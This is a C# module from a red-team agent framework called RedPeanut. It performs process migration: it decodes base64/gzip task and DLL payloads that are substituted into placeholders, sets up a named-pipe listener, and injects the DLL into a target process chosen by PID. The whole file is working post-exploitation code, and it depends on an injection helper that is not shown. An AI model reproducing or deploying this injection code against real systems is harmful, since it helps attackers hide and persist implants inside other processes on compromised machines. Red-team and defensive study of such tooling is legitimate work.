using RedPeanutAgent.Execution;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.IO.Compression;
using System.Web.Script.Serialization;

class RedPeanutMigrate
{
    static private string nutclr = "#NUTCLR#";
    static private string task = "#TASK#";
    static private int pid = Int32.Parse("#PID#");

    public static void Execute(string[] args)
    {
        try
        {
            Console.WriteLine("[*] Migrating to process " + pid);
            string rawtask = Encoding.Default.GetString(DecompressDLL(Convert.FromBase64String(task)));
            RedPeanutAgent.Core.Utility.TaskMsg taskmsg = new JavaScriptSerializer().Deserialize<RedPeanutAgent.Core.Utility.TaskMsg>(rawtask);
            
            string pipename = GetPipeName(pid);
            InjectionLoaderListener injectionLoaderListener = new InjectionLoaderListener(pipename, taskmsg);
            bool result = InjectionHelper.OpenAndInject(pid, DecompressDLL(Convert.FromBase64String(nutclr)));
            injectionLoaderListener.Execute(IntPtr.Zero, IntPtr.Zero);

            if (result)
                throw new RedPeanutAgent.Core.Utility.EndOfLifeException();
        }
        catch (RedPeanutAgent.Core.Utility.EndOfLifeException)
        {
            throw new RedPeanutAgent.Core.Utility.EndOfLifeException();
        }
        catch (Exception e)
        {
            Console.WriteLine("[*] Error migrating process");
            Console.WriteLine("[*] Error migrating process " + e.Message);
            Console.WriteLine("[*] Error migrating process" + e.StackTrace);
        }
    }

    private static byte[] DecompressDLL(byte[] gzip)
    {
        using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (MemoryStream memory = new MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }
    }

    private static string GetPipeName(int pid)
    {
        string pipename = Dns.GetHostName();
        pipename += pid.ToString();
        return pipename;

    }
}

